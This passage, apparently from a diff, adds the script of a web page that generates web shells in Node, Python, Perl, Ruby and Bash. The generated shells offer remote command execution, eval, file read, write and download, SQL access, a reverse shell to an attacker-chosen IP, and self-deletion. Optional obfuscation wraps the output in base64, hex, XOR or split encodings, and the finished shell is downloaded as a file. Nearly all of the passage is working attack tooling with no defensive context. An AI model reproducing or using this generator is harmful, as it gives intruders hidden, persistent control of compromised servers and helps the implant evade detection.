+  if(f.reverse) c += '  if(a === "reverse"){\n    const net = require("net");\n    const ip = u.searchParams.get("ip"), port = parseInt(u.searchParams.get("port"));\n    const sh = require("child_process").spawn("/bin/sh");\n    const cl = net.connect(port, ip);\n    cl.pipe(sh.stdin); sh.stdout.pipe(cl); sh.stderr.pipe(cl);\n    return res.end("connect");\n  }\n';
+  if(f.selfdestruct) c += '  if(a === "selfdestruct"){ try{ fs.unlinkSync(__filename); }catch(e){} return res.end("gone"); }\n';
+  c += '  res.end("unknown action");\n}).listen(PORT, () => console.log("listening on " + PORT));\n';
+  return c;
+}
+function genPython(p){
+  var c = 'from flask import Flask, request, send_file, Response\n';
+  c += 'import subprocess, os, platform, sys\n';
+  c += 'app = Flask(__name__)\n';
+  if(p.authEnabled){
+    var ap = rnd(5);
+    c += '@app.before_request\n';
+    c += 'def _auth():\n';
+    c += '    if request.args.get("'+ap+'") != "'+p.authValue+'":\n';
+    c += '        return "denied", 403\n';
+  }
+  c += '@app.route("/")\n';
+  c += 'def index():\n';
+  c += '    a = request.args.get("action", "cmd")\n';
+  var f = p.features;
+  if(f.cmd) c += '    if a == "cmd":\n        cmd = request.args.get("'+p.paramName+'")\n        if not cmd: return "no cmd"\n        return subprocess.run(cmd, shell=True, capture_output=True).stdout or b"ok"\n';
+  if(f.eval) c += '    if a == "eval":\n        code = request.form.get("code") or request.args.get("code")\n        try: exec(code); return "ok"\n        except Exception as e: return str(e)\n';
+  if(f.dir) c += '    if a == "list":\n        d = request.args.get("path", ".")\n        return "\\n".join(os.listdir(d))\n';
+  if(f.read) c += '    if a == "read":\n        f2 = request.args.get("file")\n        if not f2: return "no file"\n        return open(f2).read()\n';
+  if(f.write) c += '    if a == "write":\n        f2 = request.form.get("file") or request.args.get("file")\n        d2 = request.form.get("data") or request.args.get("data")\n        if not f2: return "no file"\n        open(f2, "w").write(d2 or "")\n        return "ok"\n';
+  if(f.download) c += '    if a == "download":\n        f2 = request.args.get("file")\n        if f2 and os.path.exists(f2): return send_file(f2)\n        return "not found", 404\n';
+  if(f.info) c += '    if a == "info":\n        return "os: " + platform.platform() + "\\nuser: " + os.getenv("USER","?") + "\\ncwd: " + os.getcwd() + "\\npython: " + sys.version + "\\nuid: " + str(os.getuid() if hasattr(os,"getuid") else "n/a")\n';
+  if(f.sql) c += '    if a == "sql":\n        try:\n            import sqlite3\n            conn = sqlite3.connect(request.args.get("db", ":memory:"))\n            cur = conn.execute(request.args.get("q", "SELECT 1"))\n            return "\\n".join("|".join(map(str, r)) for r in cur.fetchall())\n        except Exception as e: return str(e)\n';
+  if(f.reverse) c += '    if a == "reverse":\n        import socket\n        ip = request.args.get("ip")\n        port = int(request.args.get("port", 4444))\n        s = socket.socket()\n        s.connect((ip, port))\n        os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)\n        subprocess.call(["/bin/sh", "-i"])\n        return "ok"\n';
+  if(f.selfdestruct) c += '    if a == "selfdestruct":\n        os.remove(__file__)\n        return "gone"\n';
+  c += '    return "unknown"\n';
+  c += 'if __name__ == "__main__":\n    app.run(host="0.0.0.0", port=5000)\n';
+  return c;
+}
+function genPerl(p){
+  var c = '#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse CGI qw(:standard);\n';
+  if(p.authEnabled){
+    var ap = rnd(5);
+    c += 'my $auth = param("'+ap+'") // "";\n';
+    c += 'die "denied" unless $auth eq "'+p.authValue+'";\n';
+  }
+  c += 'my $a = param("action") // "cmd";\n';
+  var f = p.features;
+  if(f.cmd) c += 'if($a eq "cmd"){ my $cmd = param("'+p.paramName+'"); print "Content-Type: text/plain\\n\\n"; print `$cmd` if $cmd; }\n';
+  if(f.dir) c += 'elsif($a eq "list"){ my $d = param("path") // "."; print "Content-Type: text/plain\\n\\n"; print join("\\n", glob("$d/*")); }\n';
+  if(f.read) c += 'elsif($a eq "read"){ my $file = param("file"); print "Content-Type: text/plain\\n\\n"; if(open(my $fh, "<", $file)){ local $/; print <$fh>; close $fh; } else { print "cannot read"; } }\n';
+  if(f.info) c += 'elsif($a eq "info"){ print "Content-Type: text/plain\\n\\n"; print "os: $^O\\nperl: $]\\nuser: $<\\npid: $$\\n"; }\n';
+  if(f.reverse) c += 'elsif($a eq "reverse"){ use Socket; my $ip = param("ip"); my $port = param("port") // 4444; my $iaddr = inet_aton($ip); my $paddr = sockaddr_in($port, $iaddr); socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S, $paddr)){ open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S"); system("/bin/sh -i"); } }\n';
+  if(f.selfdestruct) c += 'elsif($a eq "selfdestruct"){ print "Content-Type: text/plain\\n\\n"; unlink($0); print "gone"; }\n';
+  return c;
+}
+function genRuby(p){
+  var c = "require 'sinatra'\nrequire 'open3'\n";
+  if(p.authEnabled){
+    var ap = rnd(5);
+    c += 'before do\n  halt 403 unless params["'+ap+'"] == "'+p.authValue+'"\nend\n';
+  }
+  c += 'get "/" do\n  a = params["action"] || "cmd"\n';
+  var f = p.features;
+  if(f.cmd) c += '  if a == "cmd"\n    cmd = params["'+p.paramName+'"]\n    next "no cmd" unless cmd\n    out, = Open3.capture2(cmd)\n    next out\n  end\n';
+  if(f.eval) c += '  if a == "eval"\n    begin\n      eval(params["code"] || "").to_s\n    rescue => e\n      e.message\n    end\n  end\n';
+  if(f.dir) c += '  if a == "list"\n    d = params["path"] || "."\n    Dir.entries(d).join("\\n")\n  end\n';
+  if(f.read) c += '  if a == "read"\n    File.read(params["file"])\n  end\n';
+  if(f.info) c += '  if a == "info"\n    "os: #{RUBY_PLATFORM}\\nuser: #{ENV["USER"]}\\ncwd: #{Dir.pwd}\\nruby: #{RUBY_VERSION}"\n  end\n';
+  if(f.reverse) c += '  if a == "reverse"\n    require "socket"\n    s = TCPSocket.new(params["ip"], params["port"].to_i)\n    loop do\n      cmd = s.gets\n      break unless cmd\n      s.puts(`#{cmd}`)\n    end\n  end\n';
+  if(f.selfdestruct) c += '  if a == "selfdestruct"\n    File.delete(__FILE__)\n    "gone"\n  end\n';
+  c += '  "unknown"\nend\n';
+  return c;
+}
+function genBash(p){
+  var c = '#!/bin/bash\n';
+  if(p.authEnabled){
+    var ap = rnd(5);
+    c += 'AUTH="${'+ap.toUpperCase()+'}"\n';
+    c += 'if [ "$AUTH" != "'+p.authValue+'" ]; then echo denied; exit 1; fi\n';
+  }
+  c += 'ACTION="${ACTION:-cmd}"\n';
+  var f = p.features;
+  if(f.cmd) c += 'if [ "$ACTION" = "cmd" ]; then eval "$CMD"; fi\n';
+  if(f.dir) c += 'if [ "$ACTION" = "list" ]; then ls -la "${PATH_ARG:-.}"; fi\n';
+  if(f.read) c += 'if [ "$ACTION" = "read" ]; then cat "$FILE"; fi\n';
+  if(f.info) c += 'if [ "$ACTION" = "info" ]; then uname -a; id; pwd; fi\n';
+  if(f.reverse) c += 'if [ "$ACTION" = "reverse" ]; then bash -i >& /dev/tcp/$IP/$PORT 0>&1; fi\n';
+  if(f.selfdestruct) c += 'if [ "$ACTION" = "selfdestruct" ]; then rm -f "$0"; fi\n';
+  return c;
+}
+function raw(lang, p){
+  if(lang === 'php') return genPHP(p);
+  if(lang === 'asp') return genASP(p);
+  if(lang === 'jsp') return genJSP(p);
+  if(lang === 'node') return genNode(p);
+  if(lang === 'python') return genPython(p);
+  if(lang === 'perl') return genPerl(p);
+  if(lang === 'ruby') return genRuby(p);
+  if(lang === 'bash') return genBash(p);
+  return '';
+}
+function obfPHP(code, mode, key){
+  var body = code.replace(/^\s*<\?php\s*/,'').replace(/\?>\s*$/,'').trim();
+  if(mode === 'none') return code;
+  if(mode === 'base64') return '<?php @eval(base64_decode("'+b64(body)+'")); ?>';
+  if(mode === 'hex') return '<?php @eval(hex2bin("'+hex(body)+'")); ?>';
+  if(mode === 'xor'){
+    var e = b64(xorS(body, key));
+    var k = 'k'+rnd(4), v = 'v'+rnd(4);
+    return '<?php $'+k+'="'+key+'"; $'+v+'=base64_decode("'+e+'"); $r=""; for($i=0;$i<strlen($'+v+');$i++){ $r.=chr(ord($'+v+'[$i]) ^ ord($'+k+'[$i%strlen($'+k+')])); } @eval($r); ?>';
+  }
+  if(mode === 'split'){
+    var enc = b64(body);
+    var parts = splitS(enc, 3), names = [], pre = '';
+    for(var i=0;i<parts.length;i++){ var n = 'p'+rnd(4); names.push('$'+n); pre += '$'+n+'="'+parts[i]+'"; '; }
+    return '<?php '+pre+'@eval(base64_decode('+names.join('.')+')); ?>';
+  }
+  if(mode === 'combo'){
+    var enc2 = b64(xorS(body, key));
+    var parts2 = splitS(enc2, 4), names2 = [], pre2 = '';
+    for(var j=0;j<parts2.length;j++){ var n2 = 'q'+rnd(4); names2.push('$'+n2); pre2 += '$'+n2+'="'+parts2[j]+'"; '; }
+    var k2 = 'k'+rnd(4), v2 = 'v'+rnd(4);
+    return '<?php '+pre2+'$'+k2+'="'+key+'"; $'+v2+'=base64_decode('+names2.join('.')+'); $r=""; for($i=0;$i<strlen($'+v2+');$i++){ $r.=chr(ord($'+v2+'[$i]) ^ ord($'+k2+'[$i%strlen($'+k2+')])); } @eval($r); ?>';
+  }
+  return code;
+}
+function obfNode(code, mode, key){
+  if(mode === 'none') return code;
+  if(mode === 'base64') return 'eval(Buffer.from("'+b64(code)+'","base64").toString());';
+  if(mode === 'hex') return 'eval(Buffer.from("'+hex(code)+'","hex").toString());';
+  if(mode === 'xor'){
+    var e = b64(xorS(code, key));
+    return 'const k="'+key+'";const d=Buffer.from("'+e+'","base64");let r="";for(let i=0;i<d.length;i++){r+=String.fromCharCode(d[i]^k.charCodeAt(i%k.length));}eval(r);';
+  }
+  if(mode === 'split'){
+    var enc = b64(code);
+    var parts = splitS(enc, 3), vars = [], pre = '';
+    for(var i=0;i<parts.length;i++){ var n = 'p'+rnd(4); vars.push(n); pre += 'const '+n+'="'+parts[i]+'";'; }
+    return pre+'eval(Buffer.from('+vars.join('+')+',"base64").toString());';
+  }
+  return code;
+}
+function obfPython(code, mode, key){
+  if(mode === 'none') return code;
+  if(mode === 'base64') return 'import base64; exec(base64.b64decode("'+b64(code)+'").decode())';
+  if(mode === 'hex') return 'exec(bytes.fromhex("'+hex(code)+'").decode())';
+  if(mode === 'xor'){
+    var e = b64(xorS(code, key));
+    return 'import base64; k="'+key+'"; d=base64.b64decode("'+e+'"); r="".join(chr(d[i]^ord(k[i%len(k)])) for i in range(len(d))); exec(r)';
+  }
+  return code;
+}
+function applyObf(lang, code, mode, key){
+  if(lang === 'php') return obfPHP(code, mode, key);
+  if(lang === 'node') return obfNode(code, mode, key);
+  if(lang === 'python') return obfPython(code, mode, key);
+  return code;
+}
+function build(){
+  var p = { lang: state.lang, execMethod: state.execMethod, paramName: state.paramName, authEnabled: state.authEnabled, authType: state.authType, authValue: state.authValue, features: state.features[state.lang] };
+  var rawCode = raw(state.lang, p);
+  return applyObf(state.lang, rawCode, state.obfuscation, state.xorKey);
+}
+function fmtSize(n){ if(n < 1024) return n + ' B'; if(n < 1048576) return (n/1024).toFixed(1) + ' KB'; return (n/1048576).toFixed(2) + ' MB'; }
+function update(){
+  var out = build();
+  $('output').value = out;
+  $('statSize').textContent = fmtSize(new Blob([out]).size);
+  $('statLines').textContent = out.split('\n').length;
+  var obfL = { none:'بدون', base64:'Base64', hex:'Hex', xor:'XOR', split:'Split', combo:'Combo' };
+  $('statObf').textContent = obfL[state.obfuscation] || state.obfuscation;
+  $('statObf').className = 'stat-v' + (state.obfuscation === 'none' ? '' : ' ok');
+  $('langTag').textContent = LANGS[state.lang].name;
+  var helpLines = LANGS[state.lang].help.split('\n').map(function(l){ return '<div>' + l.replace(/\?(.+?)—/g, '?<span style="color:#2563eb">$1</span>—').replace(/GET|POST/g, '<b>$&</b>') + '</div>'; }).join('');
+  $('helpContent').innerHTML = helpLines;
+}
+function bind(){
+  $('lang').addEventListener('change', function(e){
+    state.lang = e.target.value;
+    state.execMethod = LANGS[state.lang].exec[0];
+    renderExec();
+    renderFeatures();
+    update();
+  });
+  $('execMethod').addEventListener('change', function(e){ state.execMethod = e.target.value; update(); });
+  $('paramName').addEventListener('input', function(e){ state.paramName = e.target.value.trim() || 'cmd'; update(); });
+  $('randomParam').addEventListener('click', function(){ state.paramName = rnd(4).toLowerCase(); $('paramName').value = state.paramName; update(); });
+  $('authEnable').addEventListener('change', function(e){ state.authEnabled = e.target.checked; $('authWrap').style.display = state.authEnabled ? 'block' : 'none'; update(); });
+  $('authType').addEventListener('change', function(e){ state.authType = e.target.value; update(); });
+  $('authValue').addEventListener('input', function(e){ state.authValue = e.target.value; update(); });
+  $('obfuscation').addEventListener('change', function(e){
+    state.obfuscation = e.target.value;
+    var w = state.obfuscation === 'xor' || state.obfuscation === 'combo';
+    $('xorWrap').style.display = w ? 'block' : 'none';
+    update();
+  });
+  $('xorKey').addEventListener('input', function(e){ state.xorKey = e.target.value || 's3cr3t'; update(); });
+  $('copyBtn').addEventListener('click', function(){
+    var ta = $('output');
+    ta.select();
+    try { document.execCommand('copy'); this.textContent = 'کپی شد'; var s = this; setTimeout(function(){ s.textContent = 'کپی'; }, 1500); } catch(e){ this.textContent = 'خطا'; }
+  });
+  $('downloadBtn').addEventListener('click', function(){
+    var extM = { php:'php', asp:'asp', jsp:'jsp', node:'js', python:'py', perl:'pl', ruby:'rb', bash:'sh' };
+    var ext = extM[state.lang] || 'txt';
+    var blob = new Blob([$('output').value], { type:'text/plain' });
+    var a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'shell_' + Date.now() + '.' + ext;
+    a.click();
+    setTimeout(function(){ URL.revokeObjectURL(a.href); }, 1000);
+  });
+}
+bind();
+renderExec();
+renderFeatures();
+update();
+})();
+</script>
+</body>
+</html>
